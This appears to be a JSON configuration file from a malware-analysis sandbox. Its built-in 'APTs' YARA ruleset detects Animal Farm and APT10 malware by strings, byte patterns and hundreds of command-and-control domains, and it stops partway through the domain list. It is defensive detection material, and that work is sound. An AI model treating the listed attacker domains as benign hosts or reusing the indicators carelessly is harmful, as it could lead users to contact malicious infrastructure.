{
  "add_static_data_to_summary_json": true,
  "apply_yara_sample_files": true,
  "built_in_vti_rules_hash": "3f79a06aa87625afe0904c2f66b5c6ac",
  "create_stix_json": true,
  "create_summary_json": true,
  "custom_vti_rules_hash": "d41d8cd98f00b204e9800998ecf8427e",
  "enable_local_av": false,
  "max_num_static_analysis_nested": 20,
  "max_reputation_file_hash_requests": 150,
  "max_reputation_url_requests": 150,
  "max_whois_requests": 10,
  "reputation_total_timeout": 30,
  "static_analysis_max_mem": 2048,
  "static_analysis_timeout": 300,
  "vti_config": {},
  "vti_config_id": 1,
  "whois_total_timeout": 30,
  "yara": true,
  "yara_rulesets": {
    "1": {
      "builtin": true,
      "builtin_name": "APTs",
      "created": "2020-05-10 14:25:02.654965",
      "id": 1,
      "modified": "2020-08-27 12:53:30.313024",
      "name": "APTs",
      "owner_user_id": null,
      "rules": "import \"math\"\nimport \"pe\"\n\nrule AnimelFarm_ramFS\n{\n    meta:\n        description = \"RamFS: custom file system used by Animal Farm malware\"\n        threat_names = \"RamFS, Animal Farm\"\n        ref = \"http://www.welivesecurity.com/2015/06/30/dino-spying-malware-analyzed/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Calvet\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"ramFS\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $s01 = \"Check: Error in File_List\"\n        $s02 = \"Check: Error in FreeFileHeader_List\"\n        $s03 = \"CD-->[%s]\"\n        $s04 = \"!!!EXTRACT ERROR!!!File Does Not Exists-->[%s]\"\n        $s05 = \"tr4qa589\" fullword\n        $s06 = \"xT0rvwz\" fullword\n        $c01 = \"INSTALL\" fullword\n        $c02 = \"EXTRACT\" fullword\n        $c03 = \"DELETE\" fullword\n        $c04 = \"EXEC\" fullword\n        $c05 = \"INJECT\" fullword\n        $c06 = \"SLEEP\" fullword\n        $c07 = \"KILL\" fullword\n        $c08 = \"AUTODEL\" fullword\n        $c09 = \"CD\" fullword\n        $c10 = \"MD\" fullword\n\n    condition:\n        uint16(0) == 0x5a4d and ((1 of ($s*)) or (all of ($c*)))\n}\n\nrule AnimelFarm_dino\n{\n    meta:\n        description = \"Dino backdoor\"\n        threat_names = \"Dino, Animal Farm\"\n        ref = \"http://www.welivesecurity.com/2015/06/30/dino-spying-malware-analyzed/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Calvet\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"dino\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $ = \"PsmIsANiceM0du1eWith0SugarInsideA\"\n        $ = \"destroyPSM\"\n        $ = \"FM_PENDING_DOWN_%X\"\n        $ = \"%s was canceled after %d try (reached MaxTry parameter)\"\n        $ = \"you forgot value name\"\n        $ = \"wakeup successfully scheduled in %d minutes\"\n        $ = \"BD started at %s\"\n        $ = \"decyphering failed on bd\"\n\n    condition:\n        any of them\n}\n\nrule APT10_Dropper_DeploysMalwareViaSideLoading\n{\n    meta:\n        description = \"Dropper used to deploy an implant via side loading; observed deploying RedLeaves and PlugX\"\n        threat_names = \"APT10\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"USG\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dropper_DeploysMalwareViaSideLoading\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $UniqueString = {2e 6c 6e 6b [0-14] 61 76 70 75 69 2e 65 78 65}\n        $PsuedoRandomStringGenerator = {b9 1a [0-6] f7 f9 46 80 c2 41 88 54 35 8b 83 fe 64}\n\n    condition:\n        any of them\n}\n\nrule APT10_MAL_Hogfish_Report_Related_Sample\n{\n    meta:\n        description = \"APT10 / Hogfish related samples\"\n        threat_names = \"APT10\"\n        ref = \"https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_Hogfish_Report_Related_Sample\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"R=user32.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (pe.imphash() == \"efad9ff8c0d2a6419bf1dd970bcd806d\" or 1 of them)\n}\n\nrule APT10_Malware_Sample_Gen\n{\n    meta:\n        description = \"APT10 / Cloud Hopper malware campaign\"\n        threat_names = \"APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT10_Malware_Sample_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $c2_1 = \"002562066559681.r3u8.com\" ascii\n        $c2_2 = \"031168053846049.r3u8.com\" ascii\n        $c2_3 = \"0625.have8000.com\" ascii\n        $c2_4 = \"1.gadskysun.com\" ascii\n        $c2_5 = \"100fanwen.com\" ascii\n        $c2_6 = \"11.usyahooapis.com\" ascii\n        $c2_7 = \"19518473326.r3u8.com\" ascii\n        $c2_8 = \"1960445709311199.r3u8.com\" ascii\n        $c2_9 = \"1j.www1.biz\" ascii\n        $c2_10 = \"1z.itsaol.com\" ascii\n        $c2_11 = \"2012yearleft.com\" ascii\n        $c2_12 = \"2014.zzux.com\" ascii\n        $c2_13 = \"202017845.r3u8.com\" ascii\n        $c2_14 = \"2139465544784.r3u8.com\" ascii\n        $c2_15 = \"2789203959848958.r3u8.com\" ascii\n        $c2_16 = \"5590428449750026.r3u8.com\" ascii\n        $c2_17 = \"5q.niushenghuo.info\" ascii\n        $c2_18 = \"6r.suibian2010.info\" ascii\n        $c2_19 = \"9gowg.tech\" ascii\n        $c2_20 = \"Hamiltion.catholicmmb.com\" ascii\n        $c2_21 = \"a.wubangtu.info\" ascii\n        $c2_22 = \"a1.suibian2010.info\" ascii\n        $c2_24 = \"abc.wikaba.com\" ascii\n        $c2_25 = \"abcd120719.6600.org\" ascii\n        $c2_26 = \"abcd120807.3322.org\" ascii\n        $c2_27 = \"acc.emailfound.info\" ascii\n        $c2_28 = \"acc.lehigtapp.com\" ascii\n        $c2_29 = \"acsocietyy.com\" ascii\n        $c2_30 = \"ad.getfond.info\" ascii\n        $c2_31 = \"ad.webbooting.com\" ascii\n        $c2_32 = \"additional.sexidude.com\" ascii\n        $c2_33 = \"af.zyns.com\" ascii\n        $c2_34 = \"afc.https443.org\" ascii\n        $c2_35 = \"ako.ddns.us\" ascii\n        $c2_36 = \"androidmusicapp.onmypc.us\" ascii\n        $c2_37 = \"announcements.toythieves.com\" ascii\n        $c2_38 = \"anvprn.com\" ascii\n        $c2_39 = \"aotuo.9966.org\" ascii\n        $c2_40 = \"apec.qtsofta.com\" ascii\n        $c2_41 = \"app.lehigtapp.com\" ascii\n        $c2_42 = \"apple.cmdnetview.com\" ascii\n        $c2_43 = \"apple.defensewar.org\" ascii\n        $c2_44 = \"apple.ikwb.com\" ascii\n        $c2_45 = \"appledownload.ourhobby.com\" ascii\n        $c2_46 = \"appleimages.itemdb.com\" ascii\n        $c2_47 = \"appleimages.longmusic.com\" ascii\n        $c2_48 = \"applelib120102.9966.org\" ascii\n        $c2_49 = \"applemirror.organiccrap.com\" ascii\n        $c2_50 = \"applemirror.squirly.info\" ascii\n        $c2_51 = \"applemusic.isasecret.com\" ascii\n        $c2_52 = \"applemusic.itemdb.com\" ascii\n        $c2_53 = \"applemusic.wikaba.com\" ascii\n        $c2_54 = \"applemusic.xxuz.com\" ascii\n        $c2_55 = \"applemusic.zzux.com\" ascii\n        $c2_56 = \"apples.sytes.net\" ascii\n        $c2_57 = \"appleupdate.itemdb.com\" ascii\n        $c2_58 = \"architectisusa.com\" ascii\n        $c2_59 = \"area.wthelpdesk.com\" ascii\n        $c2_60 = \"army.xxuz.com\" ascii\n        $c2_61 = \"art.p6p6.net\" ascii\n        $c2_62 = \"asfzx.x24hr.com\" ascii\n        $c2_64 = \"availab.wikaba.com\" ascii\n        $c2_65 = \"availability.justdied.com\" ascii\n        $c2_66 = \"ba.my03.com\" ascii\n        $c2_67 = \"baby.macforlinux.net\" ascii\n        $c2_68 = \"baby.myie12.com\" ascii\n        $c2_69 = \"baby.usmirocomney.net\" ascii\n        $c2_70 = \"back.jungleheart.com\" ascii\n        $c2_71 = \"back.mofa.dynamic-dns.net\" ascii\n        $c2_72 = \"bak.have8000.com\" ascii\n        $c2_73 = \"bak.ignorelist.com\" ascii\n        $c2_74 = \"bak.un.dnsrd.com\" ascii\n        $c2_75 = \"balance1.wikaba.com\" ascii\n        $c2_76 = \"balk.n7go.com\" ascii\n        $c2_77 = \"banana.cmdnetview.com\" ascii\n        $c2_78 = \"barrybaker.6600.org\" ascii\n        $c2_79 = \"bbs.jungleheart.com\" ascii\n        $c2_80 = \"bdoncloud.com\" ascii\n        $c2_81 = \"be.mrslove.com\" ascii\n        $c2_82 = \"be.yourtrap.com\" ascii\n        $c2_83 = \"belowto.com\" ascii\n        $c2_84 = \"bethel.webhop.net\" ascii\n        $c2_85 = \"bexm.cleansite.biz\" ascii\n        $c2_86 = \"bezu.itemdb.com\" ascii\n        $c2_87 = \"bk56.twilightparadox.com\" ascii\n        $c2_88 = \"blaaaaaaaaaaaa.windowsupdate.3-a.net\" ascii\n        $c2_89 = \"blog.defensewar.org\" ascii\n        $c2_90 = \"brand.fartit.com\" ascii\n        $c2_91 = \"bridgeluxlightmadness.com\" ascii\n        $c2_92 = \"bulletproof.squirly.info\" ascii\n        $c2_93 = \"cao.p6p6.net\" ascii\n        $c2_94 = \"cata.qtsofta.com\" ascii\n        $c2_95 = \"catholicmmb.com\" ascii\n        $c2_96 = \"cc.dynamicdns.co.uk\" ascii\n        $c2_97 = \"ccfchrist.com\" ascii\n        $c2_98 = \"ccupdatedata.authorizeddns.net\" ascii\n        $c2_99 = \"cd.usyahooapis.com\" ascii\n        $c2_100 = \"cdn.incloud-go.com\" ascii\n        $c2_101 = \"center.shenajou.com\" ascii\n        $c2_102 = \"cgei493860.r3u8.com\" ascii\n        $c2_103 = \"chaindungeons.com\" ascii\n        $c2_104 = \"chibashiri.com\" ascii\n        $c2_105 = \"childrenstow.com\" ascii\n        $c2_106 = \"cia.ezua.com\" ascii\n        $c2_107 = \"cia.toh.info\" ascii\n        $c2_108 = \"ciaoci.chickenkiller.com\" ascii\n        $c2_109 = \"civilwar123.authorizeddns.org\" ascii\n        $c2_110 = \"civilwar520.onmypc.org\" ascii\n        $c2_111 = \"ckusshani.com\" ascii\n        $c2_112 = \"cloud-kingl.com\" ascii\n        $c2_113 = \"cloud-maste.com\" ascii\n        $c2_114 = \"cloudns.8800.org\" ascii\n        $c2_115 = \"cmdnetview.com\" ascii\n        $c2_116 = \"cms.sindeali.com\" ascii\n        $c2_117 = \"cnnews.mylftv.com\" ascii\n        $c2_118 = \"commissioner.shenajou.com\" ascii\n        $c2_119 = \"commons.onedumb.com\" ascii\n        $c2_120 = \"contactus.myddns.com\" ascii\n        $c2_121 = \"contactus.onmypc.us\" ascii\n        $c2_122 = \"contract.4mydomain.com\" ascii\n        $c2_123 = \"contractus.qpoe.com\" ascii\n        $c2_124 = \"contractus.zzux.com\" ascii\n        $c2_125 = \"coreck.suayay.com\" ascii\n        $c2_128 = \"ctdl.windowsupdate.itsaol.com\" ascii\n        $c2_129 = \"ctdl.windowsupdate.nsatcdns.com\" ascii\n        $c2_130 = \"ctldl.appledownload.ourhobby.com\" ascii\n        $c2_131 = \"ctldl.applemusic.itemdb.com\" ascii\n        $c2_132 = \"ctldl.itunesmusic.jkub.com\" ascii\n        $c2_133 = \"ctldl.microsoftmusic.onedumb.com\" ascii\n        $c2_134 = \"ctldl.microsoftupdate.qhigh.com\" ascii\n        $c2_135 = \"ctldl.windowsupdate.authorizeddns.org\" ascii\n        $c2_136 = \"ctldl.windowsupdate.authorizeddns.us\" ascii\n        $c2_137 = \"ctldl.windowsupdate.dnset.com\" ascii\n        $c2_138 = \"ctldl.windowsupdate.esmtp.biz\" ascii\n        $c2_139 = \"ctldl.windowsupdate.ezua.com\" ascii\n        $c2_140 = \"ctldl.windowsupdate.gettrials.com\" ascii\n        $c2_141 = \"ctldl.windowsupdate.itsaol.com\" ascii\n        $c2_142 = \"ctldl.windowsupdate.lflinkup.com\" ascii\n        $c2_143 = \"ctldl.windowsupdate.mrface.com\" ascii\n        $c2_144 = \"ctldl.windowsupdate.nsatcdns.com\" ascii\n        $c2_145 = \"ctldl.windowsupdate.organiccrap.com\" ascii\n        $c2_146 = \"ctldl.windowsupdate.x24hr.com\" ascii\n        $c2_147 = \"cvnx.zyns.com\" ascii\n        $c2_148 = \"cwiinatonal.com\" ascii\n        $c2_149 = \"daddy.gostudyantivirus.com\" ascii\n        $c2_150 = \"dcc.jimingroup.com\" ascii\n        $c2_151 = \"dd.ddns.us\" ascii\n        $c2_152 = \"de.onmypc.info\" ascii\n        $c2_153 = \"dear.loveddos.com\" ascii\n        $c2_154 = \"dec.seyesb.acmetoy.com\" ascii\n        $c2_155 = \"dedgesuite.net\" ascii\n        $c2_156 = \"dedydns.ns01.us\" ascii\n        $c2_157 = \"defensewar.org\" ascii\n        $c2_158 = \"demoones.com\" ascii\n        $c2_159 = \"department.shenajou.com\" ascii\n        $c2_160 = \"details.squirly.info\" ascii\n        $c2_161 = \"development.shenajou.com\" ascii\n        $c2_162 = \"devilcase.acmetoy.com\" ascii\n        $c2_163 = \"dfgwerzc.3322.org\" ascii\n        $c2_164 = \"dick.ccfchrist.com\" ascii\n        $c2_165 = \"digsby.ourhobby.com\" ascii\n        $c2_166 = \"disruptive.https443.net\" ascii\n        $c2_167 = \"dlmix.ourdvs.com\" ascii\n        $c2_168 = \"dnspoddwg.authorizeddns.org\" ascii\n        $c2_170 = \"document.methoder.com\" ascii\n        $c2_171 = \"document.shenajou.com\" ascii\n        $c2_172 = \"domainnow.yourtrap.com\" ascii\n        $c2_173 = \"download.applemusic.itemdb.com\" ascii\n        $c2_174 = \"download.microsoftmusic.onedumb.com\" ascii\n        $c2_175 = \"download.windowsupdate.authorizeddns.org\" ascii\n        $c2_176 = \"download.windowsupdate.dedgesuite.net\" ascii\n        $c2_177 = \"download.windowsupdate.dnset.com\" ascii\n        $c2_178 = \"download.windowsupdate.itsaol.com\" ascii\n        $c2_179 = \"download.windowsupdate.lflinkup.com\" ascii\n        $c2_180 = \"download.windowsupdate.nsatcdns.com\" ascii\n        $c2_181 = \"download.windowsupdate.x24hr.com\" ascii\n        $c2_182 = \"downloadlink.mypicture.info\" ascii\n        $c2_183 = \"drives.methoder.com\" ascii\n        $c2_184 = \"dst.1dumb.com\" ascii\n        $c2_185 = \"duosay.com\" ascii\n        $c2_186 = \"dyncojinf.6600.org\" ascii\n        $c2_187 = \"dynsbluecheck.7766.org\" ascii\n        $c2_188 = \"ea.onmypc.info\" ascii\n        $c2_189 = \"ea.rebatesrule.net\" ascii\n        $c2_190 = \"edgar.ccfchrist.com\" ascii\n        $c2_191 = \"ehshiroshima.mylftv.com\" ascii\n        $c2_192 = \"emailfound.info\" ascii\n        $c2_193 = \"eric-averyanov.wha.la\" ascii\n        $c2_194 = \"essashi.com\" ascii\n        $c2_195 = \"eu.acmetoy.com\" ascii\n        $c2_196 = \"eu.wha.la\" ascii\n        $c2_197 = \"eu.zzux.com\" ascii\n        $c2_198 = \"everydayfilmlink.com\" ascii\n        $c2_199 = \"ewe.toshste.com\" ascii\n        $c2_200 = \"eweek.2waky.com\" ascii\n        $c2_201 = \"exprenum.com\" ascii\n        $c2_202 = \"express.lflinkup.com\" ascii\n        $c2_203 = \"extraordinary.dynamic-dns.net\" ascii\n        $c2_204 = \"f068v.site\" ascii\n        $c2_205 = \"fabian.ccfchrist.com\" ascii\n        $c2_206 = \"fastemail.dnsrd.com\" ascii\n        $c2_207 = \"fastmail2.com\" ascii\n        $c2_208 = \"fbi.sexxxy.biz\" ascii\n        $c2_209 = \"fbi.zyns.com\" ascii\n        $c2_210 = \"fcztqbg.zj.r3u8.com\" ascii\n        $c2_211 = \"feed.jungleheart.com\" ascii\n        $c2_212 = \"fftpoor.com\" ascii\n        $c2_213 = \"fg.v4.download.windowsupdates.dnsrd.com\" ascii\n        $c2_214 = \"fgipv6.download.windowsupdate.com.mwcname.com\" ascii\n        $c2_215 = \"file.zzux.com\" ascii\n        $c2_216 = \"files.architectisusa.com\" ascii\n        $c2_217 = \"film.everydayfilmlink.com\" ascii\n        $c2_218 = \"filmlist.everydayfilmlink.com\" ascii\n        $c2_219 = \"findme.epac.to\" ascii\n        $c2_220 = \"fire.mrface.com\" ascii\n        $c2_221 = \"fish.toh.info\" ascii\n        $c2_222 = \"fiveavmersi.websegoo.net\" ascii\n        $c2_223 = \"fjs.wikaba.com\" ascii\n        $c2_224 = \"flea.poulsenv.com\" ascii\n        $c2_225 = \"flynews.edns.biz\" ascii\n        $c2_226 = \"fo.mysecondarydns.com\" ascii\n        $c2_227 = \"foal.wchildress.com\" ascii\n        $c2_228 = \"follow.wha.la\" ascii\n        $c2_229 = \"foo.shenajou.com\" ascii\n        $c2_230 = \"for.ddns.mobi\" ascii\n        $c2_231 = \"fr.wikaba.com\" ascii\n        $c2_232 = \"franck.demoones.com\" ascii\n        $c2_233 = \"ftp.2014.zzux.com\" ascii\n        $c2_234 = \"ftp.additional.sexidude.com\" ascii\n        $c2_235 = \"ftp.afc.https443.org\" ascii\n        $c2_236 = \"ftp.announcements.toythieves.com\" ascii\n        $c2_237 = \"ftp.apple.ikwb.com\" ascii\n        $c2_238 = \"ftp.appledownload.ourhobby.com\" ascii\n        $c2_239 = \"ftp.appleimages.itemdb.com\" ascii\n        $c2_240 = \"ftp.appleimages.longmusic.com\" ascii\n        $c2_241 = \"ftp.appleimages.organiccrap.com\" ascii\n        $c2_242 = \"ftp.applemirror.organiccrap.com\" ascii\n        $c2_243 = \"ftp.applemirror.squirly.info\" ascii\n        $c2_244 = \"ftp.applemusic.isasecret.com\" ascii\n        $c2_245 = \"ftp.applemusic.itemdb.com\" ascii\n        $c2_246 = \"ftp.applemusic.wikaba.com\" ascii\n        $c2_247 = \"ftp.applemusic.xxuz.com\" ascii\n        $c2_248 = \"ftp.applemusic.zzux.com\" ascii\n        $c2_249 = \"ftp.appleupdate.itemdb.com\" ascii\n        $c2_250 = \"ftp.architectisusa.com\" ascii\n        $c2_251 = \"ftp.asfzx.x24hr.com\" ascii\n        $c2_252 = \"ftp.availab.wikaba.com\" ascii\n        $c2_253 = \"ftp.availability.justdied.com\" ascii\n        $c2_254 = \"ftp.back.jungleheart.com\" ascii\n        $c2_255 = \"ftp.balance1.wikaba.com\" ascii\n        $c2_256 = \"ftp.be.mrslove.com\" ascii\n        $c2_257 = \"ftp.brand.fartit.com\" ascii\n        $c2_258 = \"ftp.bulletproof.squirly.info\" ascii\n        $c2_259 = \"ftp.cia.ezua.com\" ascii\n        $c2_260 = \"ftp.cia.toh.info\" ascii\n        $c2_261 = \"ftp.civilwar123.authorizeddns.org\" ascii\n        $c2_262 = \"ftp.civilwar520.onmypc.org\" ascii\n        $c2_263 = \"ftp.cloudfileserverbs.dynamicdns.co.uk\" ascii\n        $c2_264 = \"ftp.cnnews.mylftv.com\" ascii\n        $c2_265 = \"ftp.commons.onedumb.com\" ascii\n        $c2_266 = \"ftp.contractus.qpoe.com\" ascii\n        $c2_267 = \"ftp.cvnx.zyns.com\" ascii\n        $c2_268 = \"ftp.de.onmypc.info\" ascii\n        $c2_269 = \"ftp.details.squirly.info\" ascii\n        $c2_270 = \"ftp.devilcase.acmetoy.com\" ascii\n        $c2_271 = \"ftp.disruptive.https443.net\" ascii\n        $c2_272 = \"ftp.domainnow.yourtrap.com\" ascii\n        $c2_273 = \"ftp.ea.onmypc.info\" ascii\n        $c2_274 = \"ftp.ehshiroshima.mylftv.com\" ascii\n        $c2_275 = \"ftp.eric-averyanov.wha.la\" ascii\n        $c2_276 = \"ftp.eu.acmetoy.com\" ascii\n        $c2_277 = \"ftp.eu.wha.la\" ascii\n        $c2_278 = \"ftp.eu.zzux.com\" ascii\n        $c2_279 = \"ftp.fbi.sexxxy.biz\" ascii\n        $c2_280 = \"ftp.file.zzux.com\" ascii\n        $c2_281 = \"ftp.findme.epac.to\" ascii\n        $c2_282 = \"ftp.fire.mrface.com\" ascii\n        $c2_283 = \"ftp.fjs.wikaba.com\" ascii\n        $c2_284 = \"ftp.fr.wikaba.com\" ascii\n        $c2_285 = \"ftp.fuck.ikwb.com\" ascii\n        $c2_286 = \"ftp.fuckmm.dns-dns.com\" ascii\n        $c2_287 = \"ftp.generat.almostmy.com\" ascii\n        $c2_288 = \"ftp.goldtoyota.com\" ascii\n        $c2_289 = \"ftp.goodmusic.justdied.com\" ascii\n        $c2_290 = \"ftp.helpus.ddns.info\" ascii\n        $c2_291 = \"ftp.hii.qhigh.com\" ascii\n        $c2_292 = \"ftp.innocent-isayev.sexidude.com\" ascii\n        $c2_293 = \"ftp.invoices.sexxxy.biz\" ascii\n        $c2_294 = \"ftp.iphone.vizvaz.com\" ascii\n        $c2_295 = \"ftp.itlans.isasecret.com\" ascii\n        $c2_296 = \"ftp.itunesdownload.jkub.com\" ascii\n        $c2_297 = \"ftp.itunesdownload.wikaba.com\" ascii\n        $c2_298 = \"ftp.itunesimages.itemdb.com\" ascii\n        $c2_299 = \"ftp.itunesimages.itsaol.com\" ascii\n        $c2_300 = \"ftp.itunesimages.qpoe.com\" ascii\n        $c2_301 = \"ftp.itunesmirror.fartit.com\" ascii\n        $c2_302 = \"ftp.itunesmirror.itsaol.com\" ascii\n        $c2_303 = \"ftp.itunesmusic.ikwb.com\" ascii\n        $c2_304 = \"ftp.itunesmusic.jetos.com\" ascii\n        $c2_305 = \"ftp.itunesmusic.jkub.com\" ascii\n        $c2_306 = \"ftp.itunesmusic.zzux.com\" ascii\n        $c2_307 = \"ftp.itunesupdate.itsaol.com\" ascii\n        $c2_308 = \"ftp.itunesupdates.organiccrap.com\" ascii\n        $c2_309 = \"ftp.japanfilmsite.ikwb.com\" ascii\n        $c2_310 = \"ftp.jimin.mymom.info\" ascii\n        $c2_311 = \"ftp.jp.serveuser.com\" ascii\n        $c2_312 = \"ftp.key.zzux.com\" ascii\n        $c2_313 = \"ftp.knowledge.sellclassics.com\" ascii\n        $c2_314 = \"ftp.lan.dynssl.com\" ascii\n        $c2_315 = \"ftp.latestnews.epac.to\" ascii\n        $c2_316 = \"ftp.latestnews.organiccrap.com\" ascii\n        $c2_317 = \"ftp.leedong.longmusic.com\" ascii\n        $c2_318 = \"ftp.macfee.mrface.com\" ascii\n        $c2_319 = \"ftp.maffc.mrface.com\" ascii\n        $c2_320 = \"ftp.malware.dsmtp.com\" ascii\n        $c2_321 = \"ftp.manager.jetos.com\" ascii\n        $c2_322 = \"ftp.martin.sellclassics.com\" ascii\n        $c2_323 = \"ftp.mason.vizvaz.com\" ascii\n        $c2_324 = \"ftp.mediapath.organiccrap.com\" ascii\n        $c2_325 = \"ftp.microsoft.got-game.org\" ascii\n        $c2_326 = \"ftp.microsoft.mrface.com\" ascii\n        $c2_327 = \"ftp.microsoftimages.organiccrap.com\" ascii\n        $c2_328 = \"ftp.microsoftmusic.mrbasic.com\" ascii\n        $c2_329 = \"ftp.microsoftqckmanager.pcanywhere.net\" ascii\n        $c2_330 = \"ftp.microsoftupdate.mrbasic.com\" ascii\n        $c2_331 = \"ftp.microsoftupdate.qhigh.com\" ascii\n        $c2_332 = \"ftp.micrsoftware.dsmtp.com\" ascii\n        $c2_333 = \"ftp.mircsoft.compress.to\" ascii\n        $c2_334 = \"ftp.mmy.ddns.us\" ascii\n        $c2_335 = \"ftp.mod.jetos.com\" ascii\n        $c2_336 = \"ftp.mofa.dynamic-dns.net\" ascii\n        $c2_337 = \"ftp.mofa.ns01.info\" ascii\n        $c2_338 = \"ftp.moscowdic.trickip.org\" ascii\n        $c2_339 = \"ftp.msg.ezua.com\" ascii\n        $c2_340 = \"ftp.musicfile.ikwb.com\" ascii\n        $c2_341 = \"ftp.musicjj.zzux.com\" ascii\n        $c2_342 = \"ftp.mymusicbox.vizvaz.com\" ascii\n        $c2_343 = \"ftp.myphpwebsite.itsaol.com\" ascii\n        $c2_344 = \"ftp.myrestroomimage.isasecret.com\" ascii\n        $c2_345 = \"ftp.na.americanunfinished.com\" ascii\n        $c2_346 = \"ftp.na.onmypc.org\" ascii\n        $c2_347 = \"ftp.newsdata.jkub.com\" ascii\n        $c2_348 = \"ftp.newsroom.cleansite.info\" ascii\n        $c2_349 = \"ftp.no.authorizeddns.org\" ascii\n        $c2_350 = \"ftp.nsa.mefound.com\" ascii\n        $c2_351 = \"ftp.nt.mynumber.org\" ascii\n        $c2_352 = \"ftp.nttdata.otzo.com\" ascii\n        $c2_353 = \"ftp.nz.compress.to\" ascii\n        $c2_354 = \"ftp.ol.almostmy.com\" ascii\n        $c2_355 = \"ftp.oracleupdate.dns04.com\" ascii\n        $c2_356 = \"ftp.portal.mrface.com\" ascii\n        $c2_357 = \"ftp.portal.sendsmtp.com\" ascii\n        $c2_358 = \"ftp.portalser.dynamic-dns.net\" ascii\n        $c2_359 = \"ftp.praskovya-matveyeva.mefound.com\" ascii\n        $c2_360 = \"ftp.praskovya-ulyanova.dumb1.com\" ascii\n        $c2_361 = \"ftp.products.almostmy.com\" ascii\n        $c2_362 = \"ftp.products.cleansite.us\" ascii\n        $c2_363 = \"ftp.products.serveuser.com\" ascii\n        $c2_364 = \"ftp.purchase.lflinkup.org\" ascii\n        $c2_365 = \"ftp.recent.dns-stuff.com\" ascii\n        $c2_366 = \"ftp.recent.fartit.com\" ascii\n        $c2_367 = \"ftp.referred.gr8domain.biz\" ascii\n        $c2_368 = \"ftp.referred.yourtrap.com\" ascii\n        $c2_369 = \"ftp.register.ourhobby.com\" ascii\n        $c2_370 = \"ftp.registration2.instanthq.com\" ascii\n        $c2_371 = \"ftp.registrations.4pu.com\" ascii\n        $c2_372 = \"ftp.registrations.organiccrap.com\" ascii\n        $c2_373 = \"ftp.remeberdata.iownyour.org\" ascii\n        $c2_374 = \"ftp.reserveds.onedumb.com\" ascii\n        $c2_375 = \"ftp.rethem.almostmy.com\" ascii\n        $c2_376 = \"ftp.sdmsg.onmypc.org\" ascii\n        $c2_377 = \"ftp.se.toythieves.com\" ascii\n        $c2_378 = \"ftp.secertnews.mrbasic.com\" ascii\n        $c2_379 = \"ftp.senseye.ikwb.com\" ascii\n        $c2_380 = \"ftp.senseye.mrbonus.com\" ascii\n        $c2_381 = \"ftp.septdlluckysystem.jungleheart.com\" ascii\n        $c2_382 = \"ftp.seraphim-yurieva.justdied.com\" ascii\n        $c2_383 = \"ftp.serv.justdied.com\" ascii\n        $c2_384 = \"ftp.server1.proxydns.com\" ascii\n        $c2_385 = \"ftp.seyesb.acmetoy.com\" ascii\n        $c2_386 = \"ftp.shugiin.jkub.com\" ascii\n        $c2_387 = \"ftp.singed.otzo.com\" ascii\n        $c2_388 = \"ftp.sstday.jkub.com\" ascii\n        $c2_389 = \"ftp.support1.mrface.com\" ascii\n        $c2_390 = \"ftp.supportus.mefound.com\" ascii\n        $c2_391 = \"ftp.svc.dynssl.com\" ascii\n        $c2_392 = \"ftp.synssl.dnset.com\" ascii\n        $c2_393 = \"ftp.tamraj.fartit.com\" ascii\n        $c2_394 = \"ftp.tfa.longmusic.com\" ascii\n        $c2_395 = \"ftp.thunder.wikaba.com\" ascii\n        $c2_396 = \"ftp.ticket.instanthq.com\" ascii\n        $c2_397 = \"ftp.ticket.serveuser.com\" ascii\n        $c2_398 = \"ftp.tokyofile.2waky.com\" ascii\n        $c2_399 = \"ftp.tophost.dynamicdns.co.uk\" ascii\n        $c2_400 = \"ftp.transfer.lflinkup.org\" ascii\n        $c2_401 = \"ftp.transfer.mrbasic.com\" ascii\n        $c2_402 = \"ftp.transfer.vizvaz.com\" ascii\n        $c2_403 = \"ftp.ugreen.itemdb.com\" ascii\n        $c2_404 = \"ftp.uk.dynamicdns.org.uk\" ascii\n        $c2_405 = \"ftp.un.ddns.info\" ascii\n        $c2_406 = \"ftp.un.dnsrd.com\" ascii\n        $c2_407 = \"ftp.usa.itsaol.com\" ascii\n        $c2_408 = \"ftp.well.itsaol.com\" ascii\n        $c2_409 = \"ftp.well.mrbasic.com\" ascii\n        $c2_410 = \"ftp.wike.wikaba.com\" ascii\n        $c2_411 = \"ftp.windowfile.itemdb.com\" ascii\n        $c2_412 = \"ftp.windowsimages.itemdb.com\" ascii\n        $c2_413 = \"ftp.windowsimages.qhigh.com\" ascii\n        $c2_414 = \"ftp.windowsmirrors.vizvaz.com\" ascii\n        $c2_415 = \"ftp.windowsupdate.2waky.com\" ascii\n        $c2_416 = \"ftp.windowsupdate.3-a.net\" ascii\n        